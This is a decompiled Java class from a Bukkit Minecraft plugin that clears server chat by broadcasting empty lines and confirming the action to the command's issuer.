/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class ClearchatCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        for (int x2 = 0; x2 <= 20; ++x2) {
            Bukkit.broadcastMessage((String)"");
        }
        p2.sendMessage(Settings.PREFIX("Chat has been cleared for everyone"));
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

